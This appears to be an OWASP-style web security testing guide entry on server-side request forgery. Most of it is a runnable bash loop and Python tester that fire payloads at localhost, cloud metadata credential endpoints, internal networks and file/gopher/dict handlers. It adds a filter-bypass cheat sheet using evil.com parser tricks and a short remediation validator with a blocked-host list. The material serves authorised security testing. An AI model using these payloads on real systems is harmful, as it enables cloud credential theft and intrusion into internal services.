# WSTG-INPV-19: Testing for Server-Side Request Forgery (SSRF)

## Test ID
WSTG-INPV-19

## Test Name
Testing for Server-Side Request Forgery (SSRF)

## High-Level Description

Server-Side Request Forgery (SSRF) occurs when an attacker can make the server-side application make HTTP requests to an arbitrary domain of the attacker's choosing. This can be used to attack internal services, access cloud metadata, scan internal networks, or bypass access controls.

---

## What to Check

- [ ] URL parameter manipulation
- [ ] Internal service access
- [ ] Cloud metadata access
- [ ] Protocol smuggling
- [ ] Blind SSRF
- [ ] DNS rebinding

---

## How to Test

### Step 1: Identify SSRF Entry Points

```bash
#!/bin/bash
TARGET="https://target.com"

echo "[*] Testing for SSRF..."

# Test URL parameters
ENDPOINTS=(
    "/proxy?url="
    "/fetch?url="
    "/api/webhook?callback="
    "/share?url="
    "/preview?link="
)

# SSRF payloads
PAYLOADS=(
    "http://127.0.0.1/"
    "http://localhost/"
    "http://[::1]/"
    "http://169.254.169.254/latest/meta-data/"
    "http://metadata.google.internal/"
    "http://192.168.1.1/"
    "http://10.0.0.1/"
    "file:///etc/passwd"
)

for endpoint in "${ENDPOINTS[@]}"; do
    for payload in "${PAYLOADS[@]}"; do
        response=$(curl -s "$TARGET$endpoint$payload")
        echo "Testing: $endpoint$payload"
        echo "Response: ${response:0:100}"
    done
done
```

### Step 2: SSRF Vulnerability Tester

```python
#!/usr/bin/env python3
"""
Server-Side Request Forgery (SSRF) Vulnerability Tester
"""

import requests
import socket
import re
from urllib.parse import quote

class SSRFTester:
    def __init__(self, url, param='url'):
        self.url = url
        self.param = param
        self.findings = []
        self.session = requests.Session()

    # SSRF payloads
    PAYLOADS = {
        'localhost': [
            'http://127.0.0.1/',
            'http://localhost/',
            'http://127.0.0.1:80/',
            'http://127.0.0.1:443/',
            'http://127.0.0.1:8080/',
            'http://127.0.0.1:22/',
            'http://[::1]/',
            'http://0.0.0.0/',
            'http://0177.0.0.1/',  # Octal
            'http://2130706433/',   # Decimal
            'http://0x7f.0x0.0x0.0x1/',  # Hex
            'http://127.1/',
            'http://127.0.1/',
        ],
        'cloud_metadata': [
            # AWS
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://169.254.169.254/latest/user-data/',

            # GCP
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://169.254.169.254/computeMetadata/v1/',

            # Azure
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01',

            # DigitalOcean
            'http://169.254.169.254/metadata/v1/',

            # Alibaba
            'http://100.100.100.200/latest/meta-data/',
        ],
        'internal_network': [
            'http://192.168.0.1/',
            'http://192.168.1.1/',
            'http://10.0.0.1/',
            'http://172.16.0.1/',
            'http://intranet/',
            'http://internal/',
        ],
        'protocols': [
            'file:///etc/passwd',
            'file:///c:/windows/win.ini',
            'gopher://127.0.0.1:25/_HELO%20localhost',
            'dict://127.0.0.1:11211/stats',
            'ftp://127.0.0.1/',
        ],
        'bypass': [
            # URL encoding
            'http://127.0.0.1%2f',
            'http://127.0.0.1%09',

            # Domain confusion
            'http://127.0.0.1.nip.io/',
            'http://localtest.me/',
            'http://spoofed.burpcollaborator.net@127.0.0.1/',

            # URL parser confusion
            'http://foo@127.0.0.1/',
            'http://127.0.0.1#@evil.com/',
            'http://127.0.0.1?@evil.com/',

            # IPv6
            'http://[0:0:0:0:0:ffff:127.0.0.1]/',
            'http://[::ffff:127.0.0.1]/',
        ],
    }

    def test_localhost_access(self):
        """Test access to localhost"""
        print("\n[*] Testing localhost access...")

        for payload in self.PAYLOADS['localhost']:
            try:
                response = self.session.get(
                    self.url,
                    params={self.param: payload},
                    timeout=10
                )

                # Check for localhost indicators
                if response.status_code == 200:
                    if any(indicator in response.text.lower() for indicator in
                           ['apache', 'nginx', 'server', 'welcome', 'index']):
                        print(f"[VULN] Localhost access: {payload}")
                        self.findings.append({
                            'type': 'SSRF - Localhost Access',
                            'payload': payload,
                            'severity': 'High'
                        })
                        return True

            except Exception as e:
                pass

        return False

    def test_cloud_metadata(self):
        """Test cloud metadata access"""
        print("\n[*] Testing cloud metadata access...")

        for payload in self.PAYLOADS['cloud_metadata']:
            try:
                response = self.session.get(
                    self.url,
                    params={self.param: payload},
                    timeout=10
                )

                # Check for metadata indicators
                metadata_indicators = [
                    'ami-id', 'instance-id', 'security-credentials',
                    'computeMetadata', 'instance', 'project',
                    'iam', 'role', 'credentials',
                ]

                if response.status_code == 200:
                    for indicator in metadata_indicators:
                        if indicator in response.text:
                            print(f"[VULN] Cloud metadata access!")
                            print(f"  Payload: {payload}")
                            self.findings.append({
                                'type': 'SSRF - Cloud Metadata',
                                'payload': payload,
                                'severity': 'Critical'
                            })
                            return True

            except Exception as e:
                pass

        return False

    def test_internal_network(self):
        """Test internal network scanning"""
        print("\n[*] Testing internal network access...")

        for payload in self.PAYLOADS['internal_network']:
            try:
                response = self.session.get(
                    self.url,
                    params={self.param: payload},
                    timeout=5
                )

                if response.status_code == 200 and len(response.text) > 0:
                    print(f"[INFO] Internal endpoint responds: {payload}")
                    self.findings.append({
                        'type': 'SSRF - Internal Network',
                        'payload': payload,
                        'severity': 'High'
                    })

            except Exception as e:
                pass

    def test_protocols(self):
        """Test different protocol handlers"""
        print("\n[*] Testing protocol handlers...")

        for payload in self.PAYLOADS['protocols']:
            try:
                response = self.session.get(
                    self.url,
                    params={self.param: payload},
                    timeout=10
                )

                # Check for file content
                if 'root:' in response.text or '[extensions]' in response.text:
                    print(f"[VULN] Protocol handler: {payload.split(':')[0]}://")
                    self.findings.append({
                        'type': f'SSRF - {payload.split(":")[0].upper()} Protocol',
                        'payload': payload,
                        'severity': 'Critical'
                    })

            except Exception as e:
                pass

    def test_bypass_techniques(self):
        """Test SSRF filter bypass techniques"""
        print("\n[*] Testing bypass techniques...")

        for payload in self.PAYLOADS['bypass']:
            try:
                response = self.session.get(
                    self.url,
                    params={self.param: payload},
                    timeout=10
                )

                if response.status_code == 200 and len(response.text) > 100:
                    print(f"[INFO] Bypass payload accepted: {payload[:40]}")

            except Exception as e:
                pass

    def test_blind_ssrf(self, callback_server='YOUR-COLLABORATOR'):
        """Test blind SSRF via callback"""
        print("\n[*] Testing blind SSRF...")

        blind_payloads = [
            f'http://{callback_server}/',
            f'http://{callback_server}/ssrf?test=1',
            f'http://{callback_server}:80/',
            f'http://{callback_server}:8080/',
        ]

        for payload in blind_payloads:
            try:
                self.session.get(
                    self.url,
                    params={self.param: payload},
                    timeout=10
                )
                print(f"  Sent: {payload}")
            except Exception as e:
                pass

        print(f"  [INFO] Check {callback_server} for callbacks")

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("SSRF VULNERABILITY REPORT")
        print("="*60)

        if not self.findings:
            print("\nNo SSRF vulnerabilities confirmed.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] {f['type']}")
                print(f"  Payload: {f['payload'][:60]}")

    def run_tests(self):
        """Run all SSRF tests"""
        self.test_localhost_access()
        self.test_cloud_metadata()
        self.test_internal_network()
        self.test_protocols()
        self.test_bypass_techniques()
        # self.test_blind_ssrf()  # Uncomment with valid callback
        self.generate_report()

# Usage
tester = SSRFTester("https://target.com/fetch", param='url')
tester.run_tests()
```

### Step 3: SSRF Bypass Techniques

```
# IP Address Obfuscation
127.0.0.1 -> 2130706433 (decimal)
127.0.0.1 -> 0x7f000001 (hex)
127.0.0.1 -> 0177.0.0.1 (octal)
127.0.0.1 -> 127.1
127.0.0.1 -> [::ffff:127.0.0.1] (IPv6)

# DNS Rebinding
Use services like nip.io, xip.io
127.0.0.1.nip.io resolves to 127.0.0.1

# URL Parser Confusion
http://foo@127.0.0.1/
http://127.0.0.1#@evil.com/
http://127.0.0.1?@evil.com/
http://evil.com@127.0.0.1/

# Redirect-based bypass
Have evil.com redirect to 127.0.0.1

# Protocol confusion
gopher://127.0.0.1:25/_HELO
dict://127.0.0.1:11211/stats
```

---

## Tools

| Tool | Purpose |
|------|---------|
| Burp Collaborator | Blind SSRF detection |
| SSRFmap | Automated SSRF exploitation |
| Gopherus | Gopher payload generator |

---

## Remediation

```python
# Python - URL validation
from urllib.parse import urlparse
import ipaddress
import socket

BLOCKED_HOSTS = ['localhost', '127.0.0.1', '169.254.169.254']
ALLOWED_SCHEMES = ['http', 'https']

def is_safe_url(url):
    try:
        parsed = urlparse(url)

        # Check scheme
        if parsed.scheme not in ALLOWED_SCHEMES:
            return False

        # Resolve hostname
        hostname = parsed.hostname
        if not hostname:
            return False

        # Block known dangerous hosts
        if hostname in BLOCKED_HOSTS:
            return False

        # Resolve IP and check for internal
        ip = socket.gethostbyname(hostname)
        ip_obj = ipaddress.ip_address(ip)

        if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local:
            return False

        return True
    except:
        return False
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| SSRF cloud metadata access | 9.8 | Critical |
| SSRF to internal services | 8.6 | High |
| SSRF localhost access | 7.5 | High |
| Blind SSRF | 5.3 | Medium |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-918** | Server-Side Request Forgery (SSRF) |

---

## Checklist

```
[ ] Localhost access tested
[ ] Cloud metadata tested
[ ] Internal network tested
[ ] Protocol handlers tested
[ ] Bypass techniques tested
[ ] Blind SSRF tested
[ ] Findings documented
```
